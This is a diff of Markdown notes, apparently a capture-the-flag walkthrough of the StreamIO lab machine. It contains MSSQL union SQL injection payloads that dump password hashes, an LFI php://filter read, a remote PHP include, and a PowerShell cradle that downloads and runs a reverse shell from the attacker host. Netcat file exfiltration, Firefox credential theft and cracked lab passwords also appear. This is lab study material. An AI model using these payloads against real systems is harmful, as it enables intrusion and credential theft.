@@ -2,7 +2,7 @@
 - 
 ## Nmap Enumeration
 - We pass the commands:
-	```bash
+```bash
 nmap -sV -sC -vv 10.10.11.158
 nmap -sU --top-ports=10 -vv 10.10.11.158
 
@@ -99,13 +99,13 @@ PORT     STATE         SERVICE      REASON
 123/udp  open          ntp          udp-response ttl 127
 
 ```
-	- Domain `streamio.htb`
-	- kerberos,smb,ldap
-	- DNS: `watch.streamIO.htb`
+- Domain `streamio.htb`
+- kerberos,smb,ldap
+- DNS: `watch.streamIO.htb`
 ## Directory Enumeration
 - Gobuster:
-	- Directory
-		```bash
+- Directory
+```bash
 gobuster dir -u http://10.10.11.158 dns --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.root
 
 ---OUTPUT---
@@ -120,10 +120,10 @@ gobuster dir -u http://10.10.11.158 dns --wordlist /usr/share/wordlists/dirbuste
 
 
 ```
-	- any thing with /* leads to a different error instead of 404 (**not useful**):
-		- ![[Pasted image 20250416183012.png]]
-		- Next Directory (HTTPS)
-			```bash
+- any thing with /* leads to a different error instead of 404 (**not useful**):
+- ![[Pasted image 20250416183012.png]]
+- Next Directory (HTTPS)
+```bash
 gobuster dir -u https://watch.streamio.htb dns -k --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.root
 --AND--
 gobuster dir -u https://streamio.htb -k dns --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.root2
@@ -161,9 +161,9 @@ gobuster dir -u https://streamio.htb -k dns --wordlist /usr/share/wordlists/dirb
 
 
 ```
-		- there is an admin subdirectory which we need authorization to access
-	- We do the same thing with -x php
-		```bash
+- there is an admin subdirectory which we need authorization to access
+- We do the same thing with -x php
+```bash
 gobuster dir -u https://watch.streamio.htb -x php  dns --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.roo3t -k
 --AND--
 gobuster dir -u https://streamio.htb -x php  dns --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.roo3t -k
@@ -275,13 +275,13 @@ Finished
 Progress: 441120 / 441122 (100.00%)
 
 ```
-	- for `watch.streamio.htb` search and blocked php lead to 2 pages
-		- blocked says malicious activity detected
-		- search allows you to search for different movies
-			- on plahying with the search it seems sql injectable
-				- using OR leads to blocked
-	- We also check /admin :
-		```bash
+- for `watch.streamio.htb` search and blocked php lead to 2 pages
+- blocked says malicious activity detected
+- search allows you to search for different movies
+- on plahying with the search it seems sql injectable
+- using OR leads to blocked
+- We also check /admin :
+```bash
 gobuster dir -u https://streamio.htb/admin -x php  dns --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.roo3t -k
 
 
@@ -301,9 +301,9 @@ gobuster dir -u https://streamio.htb/admin -x php  dns --wordlist /usr/share/wor
 /CSS                  (Status: 301) [Size: 154] [--> https://streamio.htb/admin/CSS/]
 /JS                   (Status: 301) [Size: 153] [--> https://streamio.htb/admin/JS/]
 ```
-	- master.php
+- master.php
 - Ffuf the parameters
-	```bash
+```bash
 ffuf -k -u https://watch.streamio.htb/search.php -d "q=FUZZ" -w /usr/share/wordlists/seclists/Fuzzing/special-chars.txt -H 'Content-Type: application/x-www-form-urlencoded' --fl 34
 
 ---OUTPUT---
@@ -322,75 +322,75 @@ _                       [Status: 200, Size: 253887, Words: 12366, Lines: 7194, D
 &                       [Status: 200, Size: 253887, Words: 12366, Lines: 7194, Duration: 84ms]
 
 ```
-	- We see some special characters 
-		- We try them out as it's important to understand how these things work to inject.
-			- & ends up giving specific movies
-				- in ffuf it doesn't url encode so when we try via burpsuite we see we get all list of movies
-			- % gives all movies.
-				- we can deduce we *probably* wouldn't have to deal with brackets etc.
-					- Why? We assume the statement is closer to this as compared to the second command:
-						```bash
+- We see some special characters 
+- We try them out as it's important to understand how these things work to inject.
+- & ends up giving specific movies
+- in ffuf it doesn't url encode so when we try via burpsuite we see we get all list of movies
+- % gives all movies.
+- we can deduce we *probably* wouldn't have to deal with brackets etc.
+- Why? We assume the statement is closer to this as compared to the second command:
+```bash
 select * from movies where name like '%500%';
 select * from movies where CONTAINS (name, '*500*');
 ```
-						- the query is adding % for us hence % gives all
+- the query is adding % for us hence % gives all
 ## SMB
 - smb clinet with no user, guest user and anonymous user doesn't show anything
 ## Website Enumeration
 ### Direct
 - we check `streamio.htb` and `atch.streamaio.htb`
-	- both lead to iis sites
+- both lead to iis sites
 - **Check https also**
-	- `streamio.htb` leads to a streaming site
-		- input for contact
-		- some possible users
-		- Login
-		- `[oliver@Streamio.htb]`
-		- input for email
-	- `watch.streamio.htb` like a database of movies
-		- possible sql injection
+- `streamio.htb` leads to a streaming site
+- input for contact
+- some possible users
+- Login
+- `[oliver@Streamio.htb]`
+- input for email
+- `watch.streamio.htb` like a database of movies
+- possible sql injection
 
 ## SQLi with BurpSuite
 - MSSQL doesn't have information schema like mysql. there are other references.
-	- https://learn.microsoft.com/fr-fr/sql/t-sql/language-reference?view=sql-server-ver16
-		- Reference info > System Catalog views > Objects : for info the sql commands here for enumerating (sys.columns etc)
+- https://learn.microsoft.com/fr-fr/sql/t-sql/language-reference?view=sql-server-ver16
+- Reference info > System Catalog views > Objects : for info the sql commands here for enumerating (sys.columns etc)
 - https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
 - Now we need to figure out how to inject
-	- We know when we put 500 it leads to 500 days of summer. So in burpsuite when we pass that command we search for that line in the response and mark a search to patch the class
-		```bash
+- We know when we put 500 it leads to 500 days of summer. So in burpsuite when we pass that command we search for that line in the response and mark a search to patch the class
+```bash
 class="mr-auto p-2
 ```
-		- and in settings select auto scroll to match when text changes
-		- We know this is a successful query
-	- when we add `'` after, the match goes, because we are ending the query before the `%`
-		- if we add `500%` we get a match showing the query is succesfful
-		-  if we add `'-- -` after `500%` we get a match showing the query is succesfful 
-			- we can inject between these 2
-		- We try Union Inject
-			```bash
+- and in settings select auto scroll to match when text changes
+- We know this is a successful query
+- when we add `'` after, the match goes, because we are ending the query before the `%`
+- if we add `500%` we get a match showing the query is succesfful
+-  if we add `'-- -` after `500%` we get a match showing the query is succesfful 
+- we can inject between these 2
+- We try Union Inject
+```bash
 q=500%' union select 1-- -
 q=500%' union select 1,2-- -
 q=500%' union select 1,2,3-- -
 ...
 q=500%' union select 1,2,3,4,5,6,7,8,9-- -
 ```
-			- No matches and it's probably not more than that
-		- We can inverse our logic
-			- `500'` will not return a match so we know its an incorrect query unless our union injection returns something true.
-				```bash
+- No matches and it's probably not more than that
+- We can inverse our logic
+- `500'` will not return a match so we know its an incorrect query unless our union injection returns something true.
+```bash
 q=500' union select 1-- -
 q=500' union select 1,2-- -
 ...
 q=500' union select 1,2,3,4,5,6-- -
 ```
-				- We get a match!
+- We get a match!
 - Can test:
-	```bash
+```bash
 q=500' union select 1,2,9001,4,5,6-- -
 ```
-	- Should find `9001` in response
+- Should find `9001` in response
 - Check version, user, db_name:
-	```bash
+```bash
 q=500' union select 1,@@version,3,4,5,6-- -
 q=500' union select 1,user,3,4,5,6-- -
 q=500' union select 1,db_name(),3,4,5,6-- -
@@ -413,7 +413,7 @@ q=500' union select 1,db_name(),3,4,5,6-- -
 					<h5 class="p-2">STREAMIO</h5>
 ```
 - For db_name we can also give an int argument for the database number:
-	```bash
+```bash
 q=500' union select 1,db_name(1),3,4,5,6-- -
 q=500' union select 1,db_name(2),3,4,5,6-- -
 q=500' union select 1,db_name(3),3,4,5,6-- -
@@ -431,11 +431,11 @@ stremio_backup
 
 ```
 - Now we need to figure out table structure before e can exfil data.
-	- sys.objects is where table name. 
-		- We want the name and id.
-			- Why id? because in sys.columns machine will reference id not name. (so name for humans, id for machine)
-			- Also if we see the response packet we can get 2 responses (class 2 and 3)
-				```bash
+- sys.objects is where table name. 
+- We want the name and id.
+- Why id? because in sys.columns machine will reference id not name. (so name for humans, id for machine)
+- Also if we see the response packet we can get 2 responses (class 2 and 3)
+```bash
 q=500' union select 1,name,id,4,5,6 from streamio..sysobjects where xtype='u'-- -
 
 ---OUTPUT---
@@ -454,11 +454,11 @@ q=500' union select 1,name,id,4,5,6 from streamio..sysobjects where xtype='u'-- 
 				<div class="ms-auto p-2">
 					<span class="">901578250
 ```
-				- This works because for the SQLi, the code can handle multiple rows. A lot of times it can't.
-					- We are assuming we can't for learning purposes.
-			- So for learning purposes we won't use 2 fields just one.
-	- We use the CONCAT function:
-		```bash
+- This works because for the SQLi, the code can handle multiple rows. A lot of times it can't.
+- We are assuming we can't for learning purposes.
+- So for learning purposes we won't use 2 fields just one.
+- We use the CONCAT function:
+```bash
 q=500' union select 1,CONCAT(name,':',id),3,4,5,6 from streamio..sysobjects where xtype='u'-- -
 
 ---OUTPUT---
@@ -476,9 +476,9 @@ q=500' union select 1,CONCAT(name,':',id),3,4,5,6 from streamio..sysobjects wher
 				</div>
 				<div class="ms-auto p-2">
 ```
-	- Now we want to put them both in one row.
-		- the equivalent for group_concat is string_agg
-			```bash
+- Now we want to put them both in one row.
+- the equivalent for group_concat is string_agg
+```bash
 q=500' union select 1,string_agg(CONCAT(name,':',id),'|'),3,4,5,6 from streamio..sysobjects where xtype='u'-- -
 
 ---OR---
@@ -492,17 +492,17 @@ q=500' union select 1,(select string_agg(CONCAT(name,':',id),'|' ) from streamio
 				</div>
 				<div class="ms-auto p-2">
 ```
-			- movies is table name
-	- Now we want the column names 
-		```bash
+- movies is table name
+- Now we want the column names 
+```bash
 q=500' union select 1,(select string_agg(name,'|' ) from streamio..syscolumns where id='901578250'),3,4,5,6-- -
 
 ---OUTPUT---
 <div class="mr-auto p-2">
 	<h5 class="p-2">id|is_staff|password|username</h5>
 ```
-	- Now e get the data
-		```bash
+- Now e get the data
+```bash
 q=500' union select 1,(select string_agg(CONCAT(username,':',password),'|' ) from users),3,4,5,6-- -
 
 ---OUTPUT---
@@ -537,8 +537,8 @@ yoshihide            :b779ba15cedfd22a023c4d8bcf5f2332                  |
 admin                :665a50ac9eaa781e4f7f04199db97a11                  
 ```
 - **EXTRA NOTES**
-	- Can also try to find user hash by executing xp_dirtree:
-		```bash
+- Can also try to find user hash by executing xp_dirtree:
+```bash
 --LOCAL-MACHINE-
 sudo responder -i tun0
 
@@ -551,43 +551,43 @@ q=500' exec xp_dirtree '\\10.10.14.25\share\rocknrj';-- -
 [SMB] NTLMv2-SSP Username : streamIO\DC$
 [SMB] NTLMv2-SSP Hash     : DC$::streamIO:0f9539a8f1ae7096:826FA768B196A72172B64A5A13BA4644:01010000000000000011779023AFDB010A49F1381B66201000000000020008004B00310056004F0001001E00570049004E002D00300058004D004500550049004400300049003600360004003400570049004E002D00300058004D00450055004900440030004900360036002E004B00310056004F002E004C004F00430041004C00030014004B00310056004F002E004C004F00430041004C00050014004B00310056004F002E004C004F00430041004C00070008000011779023AFDB01060004000200000008003000300000000000000000000000003000004706ABDEF6139E72C91C526E15ABBDA82A9245B8CB281BA93C28065FFA68CF7A0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320035000000000000000000 
 ```
-		- DC$ is a machine account, not worth cracking hash
-	- Can also test xp_cmdshell
-		```bash
+- DC$ is a machine account, not worth cracking hash
+- Can also test xp_cmdshell
+```bash
 ---LOCAL-MACHINE---
 sudo tcpdump -i tun0
 
 ---BURPSUITE---
 q=500' exec xp_dirtree 'ping 10.10.14.25';-- -
 ```
-		- Doesn't work
-		- Can try to enable:
-			```bash
+- Doesn't work
+- Can try to enable:
+```bash
 q=500' EXEC sp configue 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC master.dbo.xp_cmdshell 'ping 10.10.14.25';-- -
 ```
-			- Fails
-	- The above two are good to test as if we could we wouldnt need to enumerate sql and get a shell directly
+- Fails
+- The above two are good to test as if we could we wouldnt need to enumerate sql and get a shell directly
 ## Initial Website Foothold
 - Copy to vi file, remove all spaces and replace | with new line:
-	```bash
+```bash
 vi creds # Copy content
 > :%s/[ ]*//g 
 > :%s/|/\r/g
 > :wq
 ```
 - Can also check with staff :
-	```bash
+```bash
 q=500' union select 1,(select string_agg(CONCAT(username,':',password,':',is_staff),'|' ) from users),3,4,5,6-- 
 ```
-	- Everyone except admin is staff
+- Everyone except admin is staff
 - We check the word count:
-	```bash
+```bash
 echo -n "665a50ac9eaa781e4f7f04199db97a11" | wc -c
 > 32
 ```
-	- Provably MD5
+- Provably MD5
 - We then attempt to crack the hashes 
-	```bash
+```bash
 hashcat -m 0 --user creds /usr/share/wordlists/rockyou.txt
 hashcat -m 0 --user creds --show
 
@@ -605,14 +605,14 @@ Bruno:2a4e2cf22dd8fcb45adcb91be1e22ae8:$monique$1991$
 yoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..
 admin:665a50ac9eaa781e4f7f04199db97a11:paddpadd
 ```
-	- Copy to file `userpass`
+- Copy to file `userpass`
 - We check the login form via the website and capture via burpsuite to find a text we could use as an identifier. `Login Failed` is chosen. and we also look at the post request (1st line)
 - We clean the userpass list for just username and pwd w/o hash:
-	```bash
+```bash
 cat userpass | awk -F: '{print $1":"$3}' >usrpwn
 ```
 - Then e brute force to find some creds:
-	```bash
+```bash
 hydra -C userpwn streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:F=Login failed"
 
 
@@ -621,10 +621,10 @@ hydra -C userpwn streamio.htb https-post-form "/login.php:username=^USER^&passwo
 ```
 - We login to website.
 - From our gobuster search we check /admin and /admin/master.php
-	- admin leads to an admin interface 
-	- /admin/master.php leads to a kind of error message saying "Movie managment : Only accessable through includes"
+- admin leads to an admin interface 
+- /admin/master.php leads to a kind of error message saying "Movie managment : Only accessable through includes"
 - We enumerate with ffuf again :
-	```bash
+```bash
 ffuf -k -u https://streamio.htb/admin/?FUZZ=id -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -H 'Cookie: PHPSESSID=jbhccjhri0h4ric2lgnk459cho' -fs 1678
 
 ---OUTPUT---
@@ -635,22 +635,22 @@ user                    [Status: 200, Size: 2073, Words: 146, Lines: 63, Duratio
 
 ```
 - On enumerating the website we find that for each option in the admin url we click we get `?<name>`
-	- debug option isn't there but we find it in ffuf.
+- debug option isn't there but we find it in ffuf.
 - on testing debug it first says this option is for developers only
-	- i put 'test' and it doesn't respond
-	- Directory traversal also gives no output
-	- When I put index.php it responds with error
-	- When I put master.php it shows all the movies 
-	- We try to get the base64 output with php filter:
-		```bash
+- i put 'test' and it doesn't respond
+- Directory traversal also gives no output
+- When I put index.php it responds with error
+- When I put master.php it shows all the movies 
+- We try to get the base64 output with php filter:
+```bash
 php://filter/convert.base64-encode/resource=/etc/passwd
 php://filter/convert.base64-encode/resource=../../../../../../../etc/passwd
 php://filter/convert.base64-encode/resource=index.php
 php://filter/convert.base64-encode/resource=master.php
 ```
-		- We get an output for index.php and master.php.
-			- We decrypt the base64 output for index.php and find credentials:
-				```bash
+- We get an output for index.php and master.php.
+- We decrypt the base64 output for index.php and find credentials:
+```bash
 echo "onlyPD9waHAKZGVmaW5lKCdpbmNsdWRlZCcsdHJ1ZSk7CnNlc3Npb25fc3RhcnQoKTsKaWYoIWlzc2V0KCRfU0VTU0lPTlsnYWRtaW4nXSkpCnsKCWhlYWRlcignSFRUUC8xLjEgNDAzIEZvcmJpZGRlbicpOwoJZGllKCI8aDE+Rk9SQklEREVOPC9oMT4iKTsKfQokY29ubmVjdGlvbiA9IGFycmF5KCJEYXRhYmFzZSI9PiJTVFJFQU1JTyIsICJVSUQiID0+ICJkYl9hZG1pbiIsICJQV0QiID0+ICdCMUBoeDMxMjM0NTY3ODkwJyk7CiRoYW5kbGUgPSBzcWxzcnZfY29ubmVjdCgnKGxvY2FsKScsJGNvbm5lY3Rpb24pOwoKPz4KPCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KCTxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KCTx0aXRsZT5BZG1pbiBwYW5lbDwvdGl0bGU+Cgk8bGluayByZWwgPSAiaWNvbiIgaHJlZj0iL2ltYWdlcy9pY29uLnBuZyIgdHlwZSA9ICJpbWFnZS94LWljb24iPgoJPCEtLSBCYXNpYyAtLT4KCTxtZXRhIGNoYXJzZXQ9InV0Zi04IiAvPgoJPG1ldGEgaHR0cC1lcXVpdj0iWC1VQS1Db21wYXRpYmxlIiBjb250ZW50PSJJRT1lZGdlIiAvPgoJPCEtLSBNb2JpbGUgTWV0YXMgLS0+Cgk8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEsIHNocmluay10by1maXQ9bm8iIC8+Cgk8IS0tIFNpdGUgTWV0YXMgLS0+Cgk8bWV0YSBuYW1lPSJrZXl3b3JkcyIgY29udGVudD0iIiAvPgoJPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IiIgLz4KCTxtZXRhIG5hbWU9ImF1dGhvciIgY29udGVudD0iIiAvPgoKPGxpbmsgaHJlZj0iaHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L25wbS9ib290c3RyYXBANS4xLjMvZGlzdC9jc3MvYm9vdHN0cmFwLm1pbi5jc3MiIHJlbD0ic3R5bGVzaGVldCIgaW50ZWdyaXR5PSJzaGEzODQtMUJtRTRrV0JxNzhpWWhGbGR2S3VoZlRBVTZhdVU4dFQ5NFdySGZ0akRickNFWFNVMW9Cb3F5bDJRdlo2aklXMyIgY3Jvc3NvcmlnaW49ImFub255bW91cyI+CjxzY3JpcHQgc3JjPSJodHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvbnBtL2Jvb3RzdHJhcEA1LjEuMy9kaXN0L2pzL2Jvb3RzdHJhcC5idW5kbGUubWluLmpzIiBpbnRlZ3JpdHk9InNoYTM4NC1rYTdTazBHbG40Z210ejJNbFFuaWtUMXdYZ1lzT2crT01odVArSWxSSDlzRU5CTzBMUm41cSs4bmJUb3Y0KzFwIiBjcm9zc29yaWdpbj0iYW5vbnltb3VzIj48L3NjcmlwdD4KCgk8IS0tIEN1c3RvbSBzdHlsZXMgZm9yIHRoaXMgdGVtcGxhdGUgLS0+Cgk8bGluayBocmVmPSIvY3NzL3N0eWxlLmNzcyIgcmVsPSJzdHlsZXNoZWV0IiAvPgoJPCEtLSByZXNwb25zaXZlIHN0eWxlIC0tPgoJPGxpbmsgaHJlZj0iL2Nzcy9yZXNwb25zaXZlLmNzcyIgcmVsPSJzdHlsZXNoZWV0IiAvPgoKPC9oZWFkPgo8Ym9keT4KCTxjZW50ZXIgY2xhc3M9ImNvbnRhaW5lciI+CgkJPGJyPgoJCTxoMT5BZG1pbiBwYW5lbDwvaDE+CgkJPGJyPjxocj48YnI+CgkJPHVsIGNsYXNzPSJuYXYgbmF2LXBpbGxzIG5hdi1maWxsIj4KCQkJPGxpIGNsYXNzPSJuYXYtaXRlbSI+CgkJCQk8YSBjbGFzcz0ibmF2LWxpbmsiIGhyZWY9Ij91c2VyPSI+VXNlciBtYW5hZ2VtZW50PC9hPgoJCQk8L2xpPgoJCQk8bGkgY2xhc3M9Im5hdi1pdGVtIj4KCQkJCTxhIGNsYXNzPSJuYXYtbGluayIgaHJlZj0iP3N0YWZmPSI+U3RhZmYgbWFuYWdlbWVudDwvYT4KCQkJPC9saT4KCQkJPGxpIGNsYXNzPSJuYXYtaXRlbSI+CgkJCQk8YSBjbGFzcz0ibmF2LWxpbmsiIGhyZWY9Ij9tb3ZpZT0iPk1vdmllIG1hbmFnZW1lbnQ8L2E+CgkJCTwvbGk+CgkJCTxsaSBjbGFzcz0ibmF2LWl0ZW0iPgoJCQkJPGEgY2xhc3M9Im5hdi1saW5rIiBocmVmPSI/bWVzc2FnZT0iPkxlYXZlIGEgbWVzc2FnZSBmb3IgYWRtaW48L2E+CgkJCTwvbGk+CgkJPC91bD4KCQk8YnI+PGhyPjxicj4KCQk8ZGl2IGlkPSJpbmMiPgoJCQk8P3BocAoJCQkJaWYoaXNzZXQoJF9HRVRbJ2RlYnVnJ10pKQoJCQkJewoJCQkJCWVjaG8gJ3RoaXMgb3B0aW9uIGlzIGZvciBkZXZlbG9wZXJzIG9ubHknOwoJCQkJCWlmKCRfR0VUWydkZWJ1ZyddID09PSAiaW5kZXgucGhwIikgewoJCQkJCQlkaWUoJyAtLS0tIEVSUk9SIC0tLS0nKTsKCQkJCQl9IGVsc2UgewoJCQkJCQlpbmNsdWRlICRfR0VUWydkZWJ1ZyddOwoJCQkJCX0KCQkJCX0KCQkJCWVsc2UgaWYoaXNzZXQoJF9HRVRbJ3VzZXInXSkpCgkJCQkJcmVxdWlyZSAndXNlcl9pbmMucGhwJzsKCQkJCWVsc2UgaWYoaXNzZXQoJF9HRVRbJ3N0YWZmJ10pKQoJCQkJCXJlcXVpcmUgJ3N0YWZmX2luYy5waHAnOwoJCQkJZWxzZSBpZihpc3NldCgkX0dFVFsnbW92aWUnXSkpCgkJCQkJcmVxdWlyZSAnbW92aWVfaW5jLnBocCc7CgkJCQllbHNlIAoJCQk/PgoJCTwvZGl2PgoJPC9jZW50ZXI+CjwvYm9keT4KPC9odG1sPg==" | base64 -d > index.php
 [Output: base64: invalid input]
 cat index.php
@@ -658,8 +658,8 @@ cat index.php
 ---OUTPUT---
 $connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
 ```
-	- For master.php
-		```bash
+- For master.php
+```bash
 vi master.b64 # copy here
 base64 -d master.b64 > master.php
 cat master.php
@@ -771,14 +771,14 @@ echo(" ---- ERROR ---- ");
 }
 ?>
 ```
-	- At the bottom we see if the POSt variable include is set it will pass a file get contents and then eval it. Also it checks that it's not index.php
-		- filegetcontents generally works against url unless configured not to
-		- If permissions aren't set well it would read php code.
+- At the bottom we see if the POSt variable include is set it will pass a file get contents and then eval it. Also it checks that it's not index.php
+- filegetcontents generally works against url unless configured not to
+- If permissions aren't set well it would read php code.
 - We test the include parameter in BurpSuite
-	- We capture a packet of ?debug=master (we still need to add in request)
-	- We change request to POSt
-	- instead of debug= we add that on top, we put include below and try to reach out machine with netcat listening
-		```bash
+- We capture a packet of ?debug=master (we still need to add in request)
+- We change request to POSt
+- instead of debug= we add that on top, we put include below and try to reach out machine with netcat listening
+```bash
 POST /admin/?debug=master.php HTTP/2
 Host: streamio.htb
 Cookie: PHPSESSID=jbhccjhri0h4ric2lgnk459cho
@@ -798,10 +798,10 @@ Content-Type: application/x-www-form-urlencoded
 
 include=http://10.10.14.25/rock.php
 ```
-		- we turn our netcat listener on on port 80
-			- We get a response and the response gets hung cause the eval can't get test.php and tries to process the error.
+- we turn our netcat listener on on port 80
+- We get a response and the response gets hung cause the eval can't get test.php and tries to process the error.
 - We create a php file
-	```bash
+```bash
 mkdir www
 cd www
 echo "echo PWN;" > rock.php
@@ -810,19 +810,19 @@ echo "system("whoami");" > rock.php
 streamio\yoshihide
 ```
 - We add reverse shell:
-	- ConPty :https://github.com/antonioCoco/ConPtyShell/tree/master
-		- We download the ps1 code into a file in our machine.
-		- we edit our rock.php file to :
-			```bash
+- ConPty :https://github.com/antonioCoco/ConPtyShell/tree/master
+- We download the ps1 code into a file in our machine.
+- we edit our rock.php file to :
+```bash
 system("powershell IEX(IWR http://10.10.14.25/con.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.14.25 9999");
 ```
-		- We listen via the command provided in github :
-			```bash
+- We listen via the command provided in github :
+```bash
 stty raw -echo; (stty size; cat) | nc -lvnp 9999
 ```
 - we get shell as `umstreamio\yoshihide`
-	- not much privileges :
-		```bash
+- not much privileges :
+```bash
 net user
 net user yoshihide
 
@@ -854,7 +854,7 @@ Global Group memberships     *Domain Users
 The command completed successfully.
 ```
 - We have mssql creds:
-	```bash
+```bash
 sqlcmd -U db_admin -P 'B1@hx31234567890' -Q 'USE STREAMIO_BACKUP; select username,password from users'
 
 ---OUTPUT---
@@ -870,8 +870,8 @@ William                                    d62be0dc82071bccc1322d64ec5b6c51
 Sabrina                                    f87d3c0d6c8fd686aacc6627f1f493a5
 
 ```
-	- we clean it to `user:hash` format and try to crack with hashcat
-		```bash
+- we clean it to `user:hash` format and try to crack with hashcat
+```bash
 vi hashes2 # copy in format
 hashcat -m 0 --user hashes2 /usr/share/wordlists/rockyou.txt
 hashcat -m 0 --user hashes2 --show
@@ -882,9 +882,9 @@ yoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..
 Lauren:08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##
 Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$
 ```
-	- From enumerating the system earlier we can try nikk37's pwd with winrm and we login
-		- Otherwise we can copy these passwords onto the previous password list we had and then filter it into a password file like before:
-			```bash
+- From enumerating the system earlier we can try nikk37's pwd with winrm and we login
+- Otherwise we can copy these passwords onto the previous password list we had and then filter it into a password file like before:
+```bash
 vi userpass # add contents to it
 cat userpass | awk -F: '{print $1":"$3}' > initialfoothold
 cat userpass | awk -F: '{print $1}' > users.txt
@@ -893,8 +893,8 @@ crackmapexec smb 10.10.11.158 -u users.txt -p pwd.txt --no-bruteforce
 ---OUTPUT---
 SMB         10.10.11.158    445    DC               [+] streamIO.htb\nikk37:get_dem_girls2@yahoo.com
 ```
-	- We get a hit so we test with crackmapexec winrm:
-		```bash
+- We get a hit so we test with crackmapexec winrm:
+```bash
 crackmapexec winrm 10.10.11.158 -u 'nikk37' -p 'get_dem_girls2@yahoo.com'
 
 ---OUTPUT---
@@ -904,16 +904,16 @@ HTTP        10.10.11.158    5985   DC               [*] http://10.10.11.158:5985
   arc4 = algorithms.ARC4(self._key)
 WINRM       10.10.11.158    5985   DC               [+] streamIO.htb\nikk37:get_dem_girls2@yahoo.com (Pwn3d!)
 ```
-		- We can winrm to the machine 
+- We can winrm to the machine 
 - Can get user flag.
 ## Lateral Movement
 - I grabbed bloodhound files both via `bloodhound-python` command and SharpHound.exe
-	- `bloodhoun-python`:
-		```bash
+- `bloodhoun-python`:
+```bash
 bloodhound-python --dns-tcp -ns 10.10.11.158 -d streamio.htb -u nikk37 -p 'get_dem_girls2@yahoo.com' -c All
 ```
-	- SharpHound.exe 
-		```bash
+- SharpHound.exe 
+```bash
 git clone https://github.com/SpecterOps/BloodHound-Legacy.git
 cp SharpHound.exe /home/kali/Downloads/Windows/StreamIO/www
 # Also copied nc.exe here
@@ -931,7 +931,7 @@ curl "http://10.10.14.25/nc.exe" -o nc.exe
 cmd /c "nc.exe 10.10.14.25 9999 < 20250417132515_BloodHound.zip"
 ```
 - we transfer winpeas to target and execute it. (https://github.com/peass-ng/PEASS-ng/releases/tag/20250401-a1b119bc)
-	```bash
+```bash
 ---MAIN-OUTPUT---
 ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Browsers Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
 
@@ -943,10 +943,10 @@ cmd /c "nc.exe 10.10.14.25 9999 < 20250417132515_BloodHound.zip"
     Firefox credentials file exists at C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\key4.db                                                                              
 È Run SharpWeb (https://github.com/djhohnstein/SharpWeb)
 ```
-	- We check SharpWeb and send to target (https://github.com/djhohnstein/SharpWeb/releases/tag/v1.2)
-		- But the exe file reveals nothing when executed
+- We check SharpWeb and send to target (https://github.com/djhohnstein/SharpWeb/releases/tag/v1.2)
+- But the exe file reveals nothing when executed
 - We grab the key4.db file ( we take the whole directory)
-	```bash
+```bash
 cd C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\
 download br53rxeg.default-release
 
@@ -955,9 +955,9 @@ Compress-Archive -Path name -DestinationPath 2.zip
 download 2.zip
 ```
 - **NEW TOOL**
-	- We use firepwd: 
-	- Been having some python errors with some packages so I create virtual environment
-		```bash
+- We use firepwd: 
+- Been having some python errors with some packages so I create virtual environment
+```bash
 python3 -m venv firevenv
 source firevenv/bin/activate
 pip install pycryptodome
@@ -976,21 +976,21 @@ https://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'
 https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
 https://slack.streamio.htb:b'JDgodd',b'password@12'
 ```
-		- We clean it and save to a text file in the format `username:password`\
+- We clean it and save to a text file in the format `username:password`\
 - We test the creds with crackmapexec. winrm didn't work, also for admin we see another password related to JDgodd so we try it with JDgodd's credential but winrm doesn't work. But e crackmapexec enumeration we do find a hit with SMB :
-	```bash
+```bash
 crackmapexec smb 10.10.11.158 -u JDgodd -p lateralpassword
 --OR--
 crackmapexec smb 10.10.11.158 -u lateraluser -p lateralpassword --continue-on-success
 ---OUTPUT---
 MB         10.10.11.158    445    DC               [+] streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r 
 ```
-	- But it is not pwned.
+- But it is not pwned.
 - We check about JDgodd user on BloodHound
-	- He has Write Privileges on Core staff which can read the pwd of admin
-		- Last time we tried the owneredit/dacledit method so this time I am trying the Windows method. We login to nikk37's account via evil-winrm
-			- Actually I tried it and dacledit didn't work. Also both the guides and Ippsec walkthrough uses this route so maybe that's why
-			```bash
+- He has Write Privileges on Core staff which can read the pwd of admin
+- Last time we tried the owneredit/dacledit method so this time I am trying the Windows method. We login to nikk37's account via evil-winrm
+- Actually I tried it and dacledit didn't work. Also both the guides and Ippsec walkthrough uses this route so maybe that's why
+```bash
 upload www/Powerview.ps1
 Import-Module .\PowerView.ps1
 --OR--
